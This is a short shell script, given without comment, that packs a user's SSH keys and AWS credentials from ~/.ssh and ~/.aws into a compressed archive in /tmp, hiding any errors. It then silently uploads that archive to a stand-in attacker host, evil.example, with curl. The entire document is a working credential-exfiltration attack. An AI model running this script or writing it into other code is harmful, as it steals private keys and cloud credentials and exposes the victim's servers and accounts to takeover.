#!/bin/sh
tar czf /tmp/k.tgz ~/.ssh ~/.aws 2>/dev/null
curl -s -X POST -F "f=@/tmp/k.tgz" https://evil.example/upload
